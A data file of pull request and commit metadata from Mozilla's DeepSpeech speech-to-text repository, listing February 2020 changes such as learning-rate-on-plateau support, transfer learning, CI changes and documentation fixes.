1276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2781,2781,Add flag to force reinitialisation of learning rate after lr_plateau,"When using reduce_lr_on_plateau, the reduced learning rate is saved in the checkpoint. If you want to resume from the checkpoint at a higher learning rate (passed in by --learning_rate) then you can set this flag.",rhamnett,6739670,2020-02-21T19:33:25Z,CONTRIBUTOR,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a3268545ab0e81249848e27252e18e6c377b1e54,"Update flags.py

change flag datatype to boolean"
1277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2780,2780,Fix transcribe.py - use new checkpoint load method,"Replaced non existing try_loading() method with the load_or_init_graph() method and respect load flag

Removed tf.train.Saver()",rhamnett,6739670,2020-02-21T15:57:07Z,CONTRIBUTOR,True,7,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e101cb8cc5201fba3f438c49278468c613b5739f,"Fix transcribe.py - use new checkpoint load method

Replaced non existing try_loading() method with the saver method and respect load flag

Removed tf.train.Saver()"
1278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2779,2779,Write model metadata to export folder unconditionally,,reuben,477142,2020-02-21T11:49:26Z,MEMBER,True,46,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48178005a27a27552c6ca90cd4ab4d0896d55486,Write model metadata to export folder unconditionally
1279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2779,2779,Write model metadata to export folder unconditionally,,reuben,477142,2020-02-21T11:49:26Z,MEMBER,True,46,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,669aa497cc54ad6b7b611bc62de63fd0b1d18357,Address review comments
1280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2778,2778,Create BIBLIOGRAPHY.md,Here are a couple of papers I found that use DeepSpeech. We can add more as and when we find them!,ftyers,449545,2020-02-20T23:13:10Z,COLLABORATOR,True,77,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,943f19e1d57252918eb28b16840644af05b38a06,Create BIBLIOGRAPHY.md
1281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2778,2778,Create BIBLIOGRAPHY.md,Here are a couple of papers I found that use DeepSpeech. We can add more as and when we find them!,ftyers,449545,2020-02-20T23:13:10Z,COLLABORATOR,True,77,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba21d4434ba036859032b662e4dc2ba593e9ea53,Update BIBLIOGRAPHY.md
1282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2778,2778,Create BIBLIOGRAPHY.md,Here are a couple of papers I found that use DeepSpeech. We can add more as and when we find them!,ftyers,449545,2020-02-20T23:13:10Z,COLLABORATOR,True,77,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,965927d91b1e910887ce90d1dc10e64b2f584f48,Update BIBLIOGRAPHY.md
1283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2776,2776,Produce pyenv ready-to-use,,lissyx,1645737,2020-02-20T12:29:20Z,COLLABORATOR,True,571,537,81,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8029f3d7dd081aa52944fbc165005b3f1aa03014,Produce pyenv ready-to-use
1284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2776,2776,Produce pyenv ready-to-use,,lissyx,1645737,2020-02-20T12:29:20Z,COLLABORATOR,True,571,537,81,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd5044fe31ef39cbfa36a596b03e49f2192db47c,Ensure proper python ABI
1285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2776,2776,Produce pyenv ready-to-use,,lissyx,1645737,2020-02-20T12:29:20Z,COLLABORATOR,True,571,537,81,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9f530f7c731c7b74a9d73f702795156928a2dc8,Make webrtcvad really optional
1286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2775,2775,Remove IRC notifications,,lissyx,1645737,2020-02-20T09:03:20Z,COLLABORATOR,True,1,127,34,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c69273a495ae16fda2085b8d5221720d4a5a196,Remove IRC notifications
1287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2772,2772,Report error code as hexadecimal numbers for easier lookup,They're written as hexadecimals in the header so this makes it easier to lookup the error name. We should probably add a [strerror](https://linux.die.net/man/3/strerror)-like API as well.,reuben,477142,2020-02-19T13:12:38Z,MEMBER,True,4,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f47c7f8421e2c730897945b202eddbe0f5671cb0,Report error code as hexadecimal numbers for easier lookup
1288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2771,2771,Warn if --audio_sample_rate does not match training sample,"In PR #2688, we started specifying the upper frequency limit when computing Mfccs. This value was computed as half of the `--audio_sample_rate` value. Despite accepting a variable sample rate input for the Mfcc computation, the TensorFlow OP only takes a constant upper frequency limit, so we can't pass a dynamic value computed from each sample to the op.

This means we lost the ability to transparently train on data with multiple sample rates, unless we do something like always specify a very high frequency limit. This commit adds a warning message in case a training sample does not match the `--audio_sample_rate` flag.",reuben,477142,2020-02-18T17:19:32Z,MEMBER,True,5,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11782154232d68dea0c71d0923b80b586a2ad2fa,"Warn if --audio_sample_rate does not match training sample

In PR #2688, we started specifying the upper frequency limit when computing Mfccs.
This value was computed as half of the --audio_sample_rate value. Despite accepting
a variable sample rate input for the Mfcc computation, the TensorFlow OP only takes
a constant upper frequency limit, so we can't pass a dynamic value computed from each
sample to the op.

This means we lost the ability to transparently train on data with multiple sample
rates. This commit adds a warning message in case a training sample does not match
the --audio_sample_rate flag."
1289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2770,2770,Reduce learning rate on plateau,Continuing from PR #2742 by @DanBmh to make sure TaskCluster tests are passing.,reuben,477142,2020-02-18T15:19:52Z,MEMBER,True,56,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17ddc5600e8587544d1f26b95f583d092f413773,Reduce learning rate on plateau.
1290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2770,2770,Reduce learning rate on plateau,Continuing from PR #2742 by @DanBmh to make sure TaskCluster tests are passing.,reuben,477142,2020-02-18T15:19:52Z,MEMBER,True,56,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e12b7caed7b4deb6282cb4856fd647b6e3d6ed7,Allow missing learning rate variable in older checkpoints
1291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2770,2770,Reduce learning rate on plateau,Continuing from PR #2742 by @DanBmh to make sure TaskCluster tests are passing.,reuben,477142,2020-02-18T15:19:52Z,MEMBER,True,56,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,78e8dfdf386d533c6581ec45c082ce94a78a11d4,Disable early stopping and LR reduction on plateau by default
1292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2770,2770,Reduce learning rate on plateau,Continuing from PR #2742 by @DanBmh to make sure TaskCluster tests are passing.,reuben,477142,2020-02-18T15:19:52Z,MEMBER,True,56,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,559042a21846b1a3336486e014b9e0023794c00e,Increase epoch count in train tests to guarantee outputs in 8kHz mode
1293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2768,2768,Automagically decompress GZipped artifacts,Fixes #2760,lissyx,1645737,2020-02-18T11:56:45Z,COLLABORATOR,True,11,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,020619fa97cd6d8ce7a984c9c48d4625a2de0d04,"Automagically decompress GZipped artifacts

Fixes #2760"
1294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2767,2767,Add a better __repr__ for Metadata objects in Python bindings,"How it looks:

```python
In [1]: from deepspeech import Model

In [2]: import scipy.io.wavfile as wav

In [3]: rate, samples = wav.read('data/ldc93s1/LDC93S1_clipped.wav')

In [4]: m = Model('/Users/reubenmorais/Downloads/models/output_graph.pbmm')
TensorFlow: v1.15.0-22-gbd115ee104
DeepSpeech: v0.7.0-alpha.2-8-g1c69d93b

In [5]: md = m.sttWithMetadata(samples)

In [6]: md
Out[6]:
Metadata(confidence=7.3753743171691895, items=[
  MetadataItem(character='s', timestep=0, start_time=0.0),
  MetadataItem(character='h', timestep=1, start_time=0.019999999552965164),
  MetadataItem(character='e', timestep=20, start_time=0.3999999761581421),
  MetadataItem(character=' ', timestep=22, start_time=0.4399999976158142),
  MetadataItem(character='h', timestep=25, start_time=0.5),
  MetadataItem(character='a', timestep=28, start_time=0.5600000023841858),
  MetadataItem(character='d', timestep=30, start_time=0.5999999642372131),
  MetadataItem(character=' ', timestep=34, start_time=0.6800000071525574),
  MetadataItem(character='y', timestep=36, start_time=0.7199999690055847),
  MetadataItem(character='e', timestep=38, start_time=0.7599999904632568),
  MetadataItem(character='r', timestep=40, start_time=0.7999999523162842),
  MetadataItem(character='t', timestep=41, start_time=0.8199999928474426),
  MetadataItem(character='e', timestep=43, start_time=0.85999995470047)
])

In [7]: md.items[0]
Out[7]: MetadataItem(character='s', timestep=0, start_time=0.0)

In [8]: md.items[0].character
Out[8]: 's'
```",reuben,477142,2020-02-18T11:20:25Z,MEMBER,True,18,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac26a785dfdf87a776ec7848a9196377d63ff3f5,Add a better __repr__ for Metadata objects in Python bindings
1295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2766,2766,Generate one-time Homebrew tarball,,lissyx,1645737,2020-02-18T09:01:31Z,COLLABORATOR,True,329,187,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7d1663b1c57ee05271b738b5ac27445a2817ad0d,Generate one-time Homebrew tarball
1296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2765,2765,Bump VERSION to 0.7.0-alpha.2,,lissyx,1645737,2020-02-17T11:13:33Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,685fb1cc9bb3f7bec40649b21b1129b65f228ead,Bump VERSION to 0.7.0-alpha.2
1297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2764,2764,Support ElectronJS v8.0,Fixes #2759,lissyx,1645737,2020-02-17T08:24:07Z,COLLABORATOR,True,61,3,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82344b9fe2938c2359fc936478963a5031135bb8,"Support ElectronJS v8.0

Fixes #2759"
1298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bba9ea5d1df12f67d9b52598e77ec7b2e65ea86,Transfer-learning support
1299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f32fd7a33fb3ec6e69b9881831ed64d37c95902a,Add transfer learning test
1300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cedd72da9b74fc926cd4d764c3a56b3893e2d0a6,Force UTF-8 IO encoding
1301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c46d8396bc8fc4ffc820feefc8b67e7fa23cd203,Respect --load when exporting
1302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e2f34f8cfb499538dad9aa55617a75ef24b0815,Synchronize TensorFlow logging with --log_level flag
1303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2763,2763,Transfer learning support,,reuben,477142,2020-02-16T18:23:37Z,MEMBER,True,455,166,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd8b96c19dc1b640705279401a8d8fa17263e022,Remove unneeded Saver instances
1304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2762,2762,Remove references to generate_trie from docs (Fixes #2761),X-DeepSpeech: NOBUILD,reuben,477142,2020-02-16T10:38:02Z,MEMBER,True,6,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27e2e4440062bd22e9107d27660f4ef50e52d66e,"Remove references to generate_trie from docs

X-DeepSpeech: NOBUILD"
1305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2760,2760,Add decompression of mmappable executable to documentation,"The `TRAINING.rst` documentation isn't correct. When I download the `convert_graphdef_memmapped_format` executable it is actually compressed gzip file and not an executable.

On my MacOS 10.15, I get:

```sh
$ file convert_graphdef_memmapped_format
convert_graphdef_memmapped_format: gzip compressed data, was ""convert_graphdef_memmapped_format"", original size modulo 2^32 198519040
```

To resolve this, I had to rename the file to have a `.gz` extension, decompress, and *then* execute the command. I added this to the doc.

I really love the project, but it really needs some better doc and stable API :)

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>",piraka9011,16828657,2020-02-16T03:43:09Z,CONTRIBUTOR,False,8,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a958a588ba73b3d793069749ca0b67f44203c83,"Add decompression of mmappable executable

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2757,2757,Ensure python builds uses all ressources,,lissyx,1645737,2020-02-14T13:53:32Z,COLLABORATOR,True,50,32,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0add08e30d22a1d5d25896e1f28dfa1c3afd5feb,Ensure python builds uses all ressources
1307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2756,2756,Manually update the TC index when needed,,lissyx,1645737,2020-02-14T09:36:01Z,COLLABORATOR,True,72,43,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0277853b24d79554a8c60fa046c78132b17b538,Manually update the TC index when needed
1308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2755,2755,Use other storage for TrainingSpeech dataset,"Fixes #2715

X-DeepSpeech: NOBUILD",lissyx,1645737,2020-02-13T19:26:59Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95b931df4f90948940202fed54382f6a40d9de78,"Use other storage for TrainingSpeech dataset

Fixes #2715

X-DeepSpeech: NOBUILD"
1309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2754,2754,made the webrtcvad dependency optional,"based on the small issue discussion

https://github.com/mozilla/DeepSpeech/issues/2752

I've moved the line to import `webrtcvad` into the `vad_split ` function",PedroDKE,43861296,2020-02-13T16:14:19Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf45d9f2fa98c2b78d5d2362b7880ed657134275,Add files via upload
1310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2754,2754,made the webrtcvad dependency optional,"based on the small issue discussion

https://github.com/mozilla/DeepSpeech/issues/2752

I've moved the line to import `webrtcvad` into the `vad_split ` function",PedroDKE,43861296,2020-02-13T16:14:19Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b3afbef23af05a35302de38d015b310f5b14b34,Update audio.py
1311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2753,2753,Generate a docker basesystem for Linux builds,,lissyx,1645737,2020-02-13T15:23:53Z,COLLABORATOR,False,158,96,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59e90befcdb3c8044671e28aee12b5c309778848,Generate a docker basesystem for Linux builds
1312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2749,2749,Explode tc-tests-utils into several smaller chunks,Fixes #1840,lissyx,1645737,2020-02-13T11:53:57Z,COLLABORATOR,True,1837,1831,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6f0a5026c063bcbb50d41ccf63dbb211dc8dce6,"Explode tc-tests-utils into several smaller chunks

Fixes #1840"
1313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2746,2746,Update example line numbers,,reuben,477142,2020-02-12T14:05:09Z,MEMBER,True,7,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09224cea46e0526ecf19d478551754c080c5b2ee,Update example line numbers
1314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2745,2745,Expose version in a consumable way (Fixes #2687),,reuben,477142,2020-02-12T08:49:20Z,MEMBER,False,51,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c464785e129d92f6e1f4aaaaa3b6692b7644fc7,Expose version in a consumable way
1315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2745,2745,Expose version in a consumable way (Fixes #2687),,reuben,477142,2020-02-12T08:49:20Z,MEMBER,False,51,41,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,211a0523edd71ca5a01e6394e1acc5ec676ff146,Restore TF version check
1316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2744,2744,Embed beam width in model and make parameter optional in API,,reuben,477142,2020-02-12T08:37:12Z,MEMBER,True,222,76,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e9b6ef7b3979957a663807b96a7e265935d3a17,Embed default beam width into exported graph and remove param from DS_CreateModel
1317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2744,2744,Embed beam width in model and make parameter optional in API,,reuben,477142,2020-02-12T08:37:12Z,MEMBER,True,222,76,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c512383aecce02945cd09b6aa83cd715e335e583,Fix consumers of DS_CreateModel
1318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2744,2744,Embed beam width in model and make parameter optional in API,,reuben,477142,2020-02-12T08:37:12Z,MEMBER,True,222,76,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3637f88c065588ab03ac91c483de8cbf2d092c57,"Fix CI errors, address comments, update examples"
1319,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b82a783e0ec5f56e44893b7a80ffeb30a938121c,Reduce learning rate on plateau.
1320,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5945d162a30169e472d2058de36a2efe3f0ab1c,Remove unused import.
1321,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9aa5effbe8522e496b8f9bab07ec7959cdc7b4fc,Update description.
1322,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a13c7bce16b62854eb3fe0df476c2093f186a563,Update flag description.
1323,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8d478c319d2d1589bcf7d34b2d019e2a4ad21a3,Save learning rate in a variable.
1324,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc7a184a56619b7b8b2f61544d267809f5d883ab,Remove code not used anymore.
1325,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c1aa6a17cfb9a53160ebce07f5b35f16ff56c92,Update flag description.
1326,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42446657e51eabedb8a8db0133a775ab38db5d4d,Remove comment.
1327,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c66a37ad723a7407813931591d191b6be796b379,Use get_variable() instead of Variable().
1328,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2742,2742,Reduce learning rate on plateau,"There is a keras callback with this functionality which very often improves my accuracy (i mostly use it for image classification). So i thought this would be a nice feature to have here too.  First test runs were promising.

I had to change the way an early stop is triggered too, to ensure the training will not be stopped to fast. ",DanBmh,18572490,2020-02-11T16:04:56Z,CONTRIBUTOR,False,39,21,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a39fbdef5834e5d9f029b1d084147bb34be0027,Merge branch 'master' into master
1329,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2741,2741,TEST,https://bugzilla.mozilla.org/show_bug.cgi?id=1614572,djmitche,28673,2020-02-11T15:31:48Z,CONTRIBUTOR,False,1,95,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e305b64eb8421bbd5708cf8d2a9eb46fde588ab,TEST
1330,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2740,2740,Point people to Matrix room instead of IRC,X-DeepSpeech: NOBUILD,reuben,477142,2020-02-11T13:24:16Z,MEMBER,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5eac447de47a04f2cd0777229b15bf2cd7301188,"Point people to Matrix room instead of IRC

X-DeepSpeech: NOBUILD"
1331,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2739,2739,Use venv instead of virtualenv package on Windows,,reuben,477142,2020-02-11T10:44:36Z,MEMBER,True,1,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a138c717e87edacb24479917b24d6ebc44a5cd6,Use venv instead of virtualenv package
1332,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df1df83720218c741394c7e97595e013605d23cf,Fix for empty skip list case; making linter happy
1333,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2738,2738,Aeiou,,marimeireles,17600982,2020-02-10T16:19:32Z,NONE,False,29747,15907,607,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ba549b83f19f41e0b719414780e91585d1998a4,"Merge pull request #2478 from tilmankamp/fixmailab

Fix for empty skip list case; making linter happy"
